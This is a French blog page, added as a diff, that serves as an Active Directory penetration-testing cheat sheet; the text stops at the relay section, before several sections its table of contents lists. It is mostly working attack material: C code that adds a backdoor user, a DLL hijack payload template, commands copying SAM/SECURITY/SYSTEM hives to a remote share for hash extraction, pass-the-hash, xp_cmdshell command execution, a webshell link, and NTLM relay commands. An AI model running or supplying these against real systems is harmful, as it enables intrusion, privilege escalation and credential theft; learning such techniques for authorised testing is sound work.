@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="fr-FR"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Cours Active Directory du pauvre | kleman.pw</title>
+<meta property="og:title" content="Cours Active Directory du pauvre | kleman.pw" />
+<meta name="twitter:title" content="Cours Active Directory du pauvre | kleman.pw" />
+<meta itemprop="name" content="Cours Active Directory du pauvre | kleman.pw" />
+<meta name="application-name" content="Cours Active Directory du pauvre | kleman.pw" />
+<meta property="og:site_name" content="kleman.pw" />
+
+<meta name="description" content="Site web de kleman.">
+<meta itemprop="description" content="Site web de kleman." />
+<meta property="og:description" content="Site web de kleman." />
+<meta name="twitter:description" content="Site web de kleman." />
+
+<meta property="og:locale" content="fr-FR" />
+<meta name="language" content="fr-FR" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/posts/2024-01-10-cours-ad-du-pauvre/" title="" />
+
+
+
+  <meta itemprop="image" content="http://localhost:1313/" />
+  <meta property="og:image" content="http://localhost:1313/" />
+  <meta name="twitter:image" content="http://localhost:1313/" />
+  <meta name="twitter:image:src" content="http://localhost:1313/" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-01-10T00:00:00Z />
+    <meta property="article:published_time" content=2024-01-10T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Cours Active Directory du pauvre",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-01-10",
+        "description": "",
+        "wordCount":  1325 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-01-10",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kleman.pw"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.125.1">
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/2024-01-10-cours-ad-du-pauvre/">
+    <link href="/style.min.18927ce2d0dc33c991e188f9b4efd25929b9589151125f809e2b3f45e447e971.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        Whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Cours Active Directory du pauvre</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-01-10T00:00:00&#43;00:00" itemprop="datePublished"> Jan 10, 2024 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><strong><em>On essaye d&rsquo;apprendre des trucs ouuuuuuuuuuuuuuuuuuuu</em></strong></p>
+<h1 id="table-des-matières">Table des matières</h1>
+<h1 id="table-des-matières-1">Table des matières</h1>
+<ul>
+<li><a href="#table-des-mati%C3%A8res">Table des matières</a></li>
+<li><a href="#table-des-mati%C3%A8res-1">Table des matières</a></li>
+<li><a href="#installation-de-la-caisse-%C3%A0-outils">Installation de la caisse à outils</a>
+<ul>
+<li><a href="#nxc">NXC</a>
+<ul>
+<li><a href="#usage">Usage:</a></li>
+</ul>
+</li>
+<li><a href="#impacket">Impacket</a>
+<ul>
+<li><a href="#usage-1">Usage:</a></li>
+</ul>
+</li>
+<li><a href="#bloodhound">Bloodhound</a>
+<ul>
+<li><a href="#usage-2">Usage:</a></li>
+</ul>
+</li>
+<li><a href="#evil-winrm">Evil-winrm</a>
+<ul>
+<li><a href="#usage-3">Usage:</a></li>
+</ul>
+</li>
+<li><a href="#psencoder">Psencoder</a></li>
+<li><a href="#compilation-cross-os">Compilation cross OS</a>
+<ul>
+<li><a href="#package-a-install%C3%A9-chat-gpt-%C3%A9dition">Package a installé (Chat GPT édition)</a></li>
+<li><a href="#compilation-dun-exe">Compilation d&rsquo;un EXE</a></li>
+<li><a href="#compilation-dune-dll">Compilation d&rsquo;une DLL</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#windows">Windows</a>
+<ul>
+<li><a href="#shares">Shares</a>
+<ul>
+<li><a href="#smbclient">smbclient</a></li>
+<li><a href="#mount">mount</a></li>
+<li><a href="#nxc-1">nxc</a></li>
+<li><a href="#windows-1">windows</a></li>
+</ul>
+</li>
+<li><a href="#services">Services</a>
+<ul>
+<li><a href="#windows-2">windows</a>
+<ul>
+<li><a href="#en-mode-jolie">En mode jolie</a></li>
+<li><a href="#unquoted-service">Unquoted service</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#extraction-de-mot-de-passe">Extraction de mot de passe</a>
+<ul>
+<li><a href="#windows-3">Windows</a></li>
+<li><a href="#traitement">Traitement</a></li>
+</ul>
+</li>
+<li><a href="#mssql">MSSQL</a>
+<ul>
+<li><a href="#windows-4">Windows</a></li>
+<li><a href="#linux">Linux</a></li>
+<li><a href="#rce">RCE</a></li>
+</ul>
+</li>
+<li><a href="#iis">IIS</a>
+<ul>
+<li><a href="#webshell">WebShell</a></li>
+</ul>
+</li>
+<li><a href="#privil%C3%A8ges">Privilèges</a>
+<ul>
+<li><a href="#seimpersonate">SeImpersonate</a></li>
+<li><a href="#activation-de-tout-les-privil%C3%A8ges">Activation de tout les privilèges</a></li>
+<li><a href="#changement-dutilisateur">Changement d&rsquo;utilisateur</a></li>
+</ul>
+</li>
+<li><a href="#gestion-des-utilisateurs-et-groupes">Gestion des utilisateurs et groupes</a></li>
+</ul>
+</li>
+<li><a href="#active-directory">Active Directory</a>
+<ul>
+<li><a href="#enum%C3%A9ration-des-partages-sans-mot-de-passes">Enumération des partages sans mot de passes</a>
+<ul>
+<li><a href="#windows-5">Windows</a></li>
+<li><a href="#linux-1">Linux</a></li>
+</ul>
+</li>
+<li><a href="#dump-ldap">Dump Ldap</a>
+<ul>
+<li><a href="#linux-2">Linux</a></li>
+</ul>
+</li>
+<li><a href="#bloodhound-1">Bloodhound</a>
+<ul>
+<li><a href="#windows-6">Windows</a></li>
+<li><a href="#linux-3">Linux</a></li>
+</ul>
+</li>
+<li><a href="#cr%C3%A9ation-dun-compte-machine">Création d&rsquo;un compte machine</a>
+<ul>
+<li><a href="#linux-4">Linux</a></li>
+</ul>
+</li>
+<li><a href="#relais">Relais</a>
+<ul>
+<li><a href="#linux-5">Linux</a></li>
+</ul>
+</li>
+<li><a href="#krbrelayup">KrbRelayUp</a></li>
+<li><a href="#dump-lsass">Dump Lsass</a>
+<ul>
+<li><a href="#windows-7">Windows</a></li>
+<li><a href="#linux-6">Linux</a></li>
+</ul>
+</li>
+<li><a href="#dump-ntds">Dump NTDS</a>
+<ul>
+<li><a href="#windows-8">Windows</a></li>
+<li><a href="#linux-7">Linux</a></li>
+</ul>
+</li>
+<li><a href="#adcs">ADCS</a>
+<ul>
+<li><a href="#info-sur-adcs">Info sur ADCS</a></li>
+<li><a href="#cr%C3%A9ation-de-certificats">création de certificats</a></li>
+<li><a href="#demande-de-tgt-avec-un-certificat">Demande de TGT avec un certificat</a></li>
+<li><a href="#r%C3%A9cup%C3%A9ration-du-hash-via-un-tgt">Récupération du hash via un tgt</a></li>
+<li><a href="#relai-sur-le-web-enrollement-de-ladcs">Relai sur le web enrollement de l&rsquo;ADCS</a></li>
+<li><a href="#coerce-de-gros-porc">Coerce de gros porc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#lab">Lab</a>
+<ul>
+<li><a href="#ad"><strong>AD</strong></a></li>
+<li><a href="#srv-standelone">Srv standelone</a></li>
+<li><a href="#plage">plage</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="installation-de-la-caisse-à-outils">Installation de la caisse à outils</h1>
+<p>L&rsquo;ensemble des outils requiert Python3. Si ce dernier n&rsquo;est pas installé, vous devez le faire pour garantir un fonctionnement sans entraves.</p>
+<h2 id="nxc">NXC</h2>
+<p>NXC, un fork agressif de CrackMapExec (CME), est préféré à CME. NetExec, alias NXC, est un outil polyvalent essentiel à maîtriser dans le contexte de cette évaluation de sécurité.</p>
+<pre tabindex="0"><code>git clone https://github.com/Pennyw0rth/NetExec.git
+cd NetExec
+python3 -m venv .
+source ./bin/activate
+pip3 install .
+deactivate
+touch ~/.klemouWasHere
+</code></pre><h3 id="usage">Usage:</h3>
+<p>nxc est présent dans ./bin/nxc</p>
+<pre tabindex="0"><code>nxc smb 10.10.10.0/24 -u &#39;&#39; -p &#39;&#39;
+</code></pre><h2 id="impacket">Impacket</h2>
+<p>Outils indispensables pour réaliser un test d&rsquo;intrusion à partir d&rsquo;un environnement Linux. Il convient de noter que ces outils sont déjà inclus dans NXC. Je réitère cette information au cas où, tout étant déjà incorporé dans ce qui a été précédemment évoqué.</p>
+<pre tabindex="0"><code>git clone https://github.com/fortra/impacket.git
+cd impacket
+python3 -m venv .
+source ./bin/activate
+pip3 install .
+deactivate
+touch ~/.klemouWasHere1
+</code></pre><h3 id="usage-1">Usage:</h3>
+<p>Tu attends la suite du cours.</p>
+<h2 id="bloodhound">Bloodhound</h2>
+<p>Un autre outil indispensable est BloodHound, qui offre la visualisation graphique des éléments de l&rsquo;Active Directory, permettant ainsi d&rsquo;identifier et de proposer des scénarios de compromission.</p>
+<p>Neo4j</p>
+<pre tabindex="0"><code>docker pull neo4j
+docker run -d --rm -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/CrzTonWifiCestDeLaMerde neo4j
+</code></pre><p>Bloodhound</p>
+<pre tabindex="0"><code>https://github.com/BloodHoundAD/BloodHound # tu chope la release
+unzip BloodHound-linux-x64.zip
+cd BloodHound-linux-x64 &amp;&amp; ./Bloodhound
+</code></pre><p>Si tu n&rsquo;as pas docker kado <a href="https://letmegooglethat.com/?q=docker+linux">install</a></p>
+<h3 id="usage-2">Usage:</h3>
+<p>Ca hack fort ouuuuuuuuuuuuuuuuuuuuuuuuuuuu</p>
+<h2 id="evil-winrm">Evil-winrm</h2>
+<p>blabla</p>
+<pre tabindex="0"><code>gem install evil-winrm # bien ajouter la path de gem à ca $PATH
+</code></pre><h3 id="usage-3">Usage:</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u user -p password -i ip
+</span></span></code></pre></div><h2 id="psencoder">Psencoder</h2>
+<p>Petite auto promo :</p>
+<ul>
+<li><a href="https://psencoder.pythonanywhere.com/">https://psencoder.pythonanywhere.com/</a></li>
+</ul>
+<h2 id="compilation-cross-os">Compilation cross OS</h2>
+<h3 id="package-a-installé-chat-gpt-édition">Package a installé (Chat GPT édition)</h3>
+<pre tabindex="0"><code># Debian/Ubuntu
+sudo apt-get update
+sudo apt-get install mingw-w64
+
+# Fedora
+sudo dnf install mingw64-gcc mingw64-gcc-c++ mingw64-winpthreads-static
+
+# openSUSE
+sudo zypper install mingw64-gcc mingw64-gcc-c++
+
+# Arch Linux
+sudo pacman -S mingw-w64-gcc
+
+# CentOS (Utilisez EPEL pour CentOS)
+sudo yum install mingw64-gcc mingw64-gcc-c++
+
+# Alpine Linux
+sudo apk add mingw-w64-gcc mingw-w64-g++ mingw-w64-headers
+
+# Void Linux
+sudo xbps-install -S mingw-w64-gcc mingw-w64-g++ mingw-w64-headers
+</code></pre><h3 id="compilation-dun-exe">Compilation d&rsquo;un EXE</h3>
+<pre tabindex="0"><code>x86_64-w64-mingw32-gcc -o magie.exe magie.c   # 64 bits
+i686-w64-mingw32-gcc   -o magie.exe magie.c   # 32 bits
+touch ~/.klemou_was_here                      # 128 bits
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;net user klemou Sup3rP@ssword /add&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="compilation-dune-dll">Compilation d&rsquo;une DLL</h3>
+<pre tabindex="0"><code>x86_64-w64-mingw32-gcc   -shared -o target.dll target.c
+i686-w64-mingw32-gcc     -shared -o target.dll target.c
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Payload</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// magie
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span><span class="n">fdwReason</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">Payload</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Les projets qui vont bien:</p>
+<ul>
+<li><a href="https://github.com/tothi/dll-hijack-by-proxying">https://github.com/tothi/dll-hijack-by-proxying</a></li>
+</ul>
+<h1 id="windows">Windows</h1>
+<h2 id="shares">Shares</h2>
+<h3 id="smbclient">smbclient</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Debian/Ubuntu-based systems (using apt)</span>
+</span></span><span class="line"><span class="cl">apt-get update <span class="o">&amp;&amp;</span> apt-get install smbclient
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Red Hat/Fedora-based systems (using dnf)</span>
+</span></span><span class="line"><span class="cl">dnf install samba-client
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># CentOS (using yum)</span>
+</span></span><span class="line"><span class="cl">yum install samba-client
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Arch Linux (using pacman)</span>
+</span></span><span class="line"><span class="cl">pacman -S smbclient
+</span></span></code></pre></div><pre tabindex="0"><code>smbclient -N -L \\\\ip
+smbclient -N \\\\ip\\Share
+smbclient -U &#39;User%Password&#39; \\\\ip\\Share
+smbclient --pw-nt-hash -U &#39;user%hash&#39; \\\\ip\\Share
+</code></pre><h3 id="mount">mount</h3>
+<pre tabindex="0"><code># Debian/Ubuntu-based systems (using apt)
+apt-get update &amp;&amp; apt-get install cifs-utils
+
+# Red Hat/Fedora-based systems (using dnf)
+dnf install cifs-utils
+
+# CentOS (using yum)
+yum install cifs-utils
+
+# Arch Linux (using pacman)
+pacman -S cifs-utils
+
+# openSUSE (using zypper)
+zypper install cifs-utils
+</code></pre><pre tabindex="0"><code>mount -t cifs //ip/Name /point/de/montage/
+mount -t cifs -o username=crz,password=TonWifiEstNull //ip/Name /point/de/montage/
+</code></pre><h3 id="nxc-1">nxc</h3>
+<pre tabindex="0"><code>nxc smb ip
+nxc smb ip -u &#39;user&#39; -p &#39;password&#39;
+nxc smb ip -u &#39;user&#39; -H &#39;:CC978D063970FC60FD9DA830D160A229&#39;
+</code></pre><h3 id="windows-1">windows</h3>
+<pre tabindex="0"><code>net share
+net use Z: \\computer_name\share_name
+</code></pre><h2 id="services">Services</h2>
+<h3 id="windows-2">windows</h3>
+<pre tabindex="0"><code>sc query          # cmd.exe
+Get-Service       # powershell.exe
+wmic service get  # wmic
+services.msc      # UI
+</code></pre><h4 id="en-mode-jolie">En mode jolie</h4>
+<pre tabindex="0"><code>wmic service get name,displayname,startmode,pathname,startname
+Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode, StartName
+</code></pre><h4 id="unquoted-service">Unquoted service</h4>
+<pre tabindex="0"><code>Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode, StartName | Where {$_.PathName -notlike &#34;C:\Windows*&#34; -and $_.PathName -notlike &#39;&#34;*&#39;} | select Name,DisplayName,StartMode,PathName,StartName
+</code></pre><h2 id="extraction-de-mot-de-passe">Extraction de mot de passe</h2>
+<h3 id="windows-3">Windows</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SAM</span> <span class="s2">&#34;\\ip\SHARE\sam.save&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SECURITY</span> <span class="s2">&#34;\\ip\SHARE\security.save&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="s2">&#34;\\ip\SHARE\system.save&#34;</span>
+</span></span></code></pre></div><h3 id="traitement">Traitement</h3>
+<pre tabindex="0"><code>secretdump LOCAL -sam sam.save -security security.save -system system.save
+</code></pre><h2 id="mssql">MSSQL</h2>
+<h3 id="windows-4">Windows</h3>
+<p>Azure Data Studio</p>
+<h3 id="linux">Linux</h3>
+<pre tabindex="0"><code>mssqlclient.py user:password@ip
+mssqlclient.py -windows-auth user:password@ip
+</code></pre><h3 id="rce">RCE</h3>
+<pre tabindex="0"><code># This turns on advanced options and is needed to configure xp_cmdshell
+sp_configure &#39;show advanced options&#39;, &#39;1&#39;
+RECONFIGURE
+#This enables xp_cmdshell
+sp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;
+RECONFIGURE
+
+# Quickly check what the service account is via xp_cmdshell
+EXEC master..xp_cmdshell &#39;whoami&#39;
+</code></pre><h2 id="iis">IIS</h2>
+<h3 id="webshell">WebShell</h3>
+<p>cmd.aspx:</p>
+<ul>
+<li><a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx</a></li>
+</ul>
+<h2 id="privilèges">Privilèges</h2>
+<h3 id="seimpersonate">SeImpersonate</h3>
+<p>Explication et exploitation:</p>
+<ul>
+<li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a></li>
+<li><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a></li>
+</ul>
+<h3 id="activation-de-tout-les-privilèges">Activation de tout les privilèges</h3>
+<p><a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1</a></p>
+<h3 id="changement-dutilisateur">Changement d&rsquo;utilisateur</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;sql_user&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="s2">&#34;ee3f628e3b.14501b0b8f&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$credentials</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="n">-ArgumentList</span> <span class="vm">@</span><span class="p">(</span><span class="nv">$username</span><span class="p">,(</span><span class="nb">ConvertTo-SecureString</span> <span class="n">-String</span> <span class="nv">$password</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="n">-WorkingDirectory</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span> <span class="n">-Credential</span> <span class="p">(</span><span class="nv">$credentials</span><span class="p">)</span>
+</span></span></code></pre></div><h2 id="gestion-des-utilisateurs-et-groupes">Gestion des utilisateurs et groupes</h2>
+<pre tabindex="0"><code>net user # list les utilisateurs
+net user username password /add # ajout d&#39;un utilisateur
+net user username /del # suppresion d&#39;un utilisateur
+
+net localgroup # list des groupes
+net localgroup groupename user /add # ajout d&#39;un utilisateur dans un groupe
+net localgroup groupename user /del # suppresion d&#39;un utilisateur dans un groupe
+</code></pre><h1 id="active-directory">Active Directory</h1>
+<h2 id="enumération-des-partages-sans-mot-de-passes">Enumération des partages sans mot de passes</h2>
+<h3 id="windows-5">Windows</h3>
+<pre tabindex="0"><code>snaffler.exe -s -o snaffler.log
+</code></pre><h3 id="linux-1">Linux</h3>
+<pre tabindex="0"><code>nxc smb ip/24 -u &#34;a&#34; -p &#34;&#34; --shares
+</code></pre><h2 id="dump-ldap">Dump Ldap</h2>
+<h3 id="linux-2">Linux</h3>
+<pre tabindex="0"><code>ldapdomaindump -u &#39;DOMAIN\user&#39; -p &#39;pass&#39; dc01.domain.local
+</code></pre><h2 id="bloodhound-1">Bloodhound</h2>
+<h3 id="windows-6">Windows</h3>
+<pre tabindex="0"><code>.\SharpHound.exe -c all
+</code></pre><h3 id="linux-3">Linux</h3>
+<pre tabindex="0"><code>rusthound --domain domain.local -u &#39;user&#39; -p &#39;password&#39;  -o output -z --fqdn-resolver --name-server dc.domain.local
+bloodhound-python -u user -p &#39;password&#39; -ns 10.10.10.10 -d domain.local -c all
+</code></pre><h2 id="création-dun-compte-machine">Création d&rsquo;un compte machine</h2>
+<h3 id="linux-4">Linux</h3>
+<pre tabindex="0"><code># Add a computer account
+addcomputer.py -computer-name &#39;COMPUTER$&#39; -computer-pass &#39;SomePassword&#39; -dc-host $DomainController -domain-netbios $DOMAIN &#39;DOMAIN\user:password&#39;
+
+# Modify a computer account password
+addcomputer.py -computer-name &#39;COMPUTER$&#39; -computer-pass &#39;SomePassword&#39; -dc-host $DomainController -no-add &#39;DOMAIN\user:password&#39;
+
+# Delete a computer account
+addcomputer.py -computer-name &#39;COMPUTER$&#39; -dc-host $DomainController -delete &#39;DOMAIN\user:password&#39;
+</code></pre><h2 id="relais">Relais</h2>
+<h3 id="linux-5">Linux</h3>
+<pre tabindex="0"><code>ntlmrelayx.py -t &#34;ldaps://dc01.klemou.corp&#34; -smb2support
+ntlmrelayx.py -t &#34;ldap://dc01.klemou.corp&#34; -smb2support --escalate-user domainuser
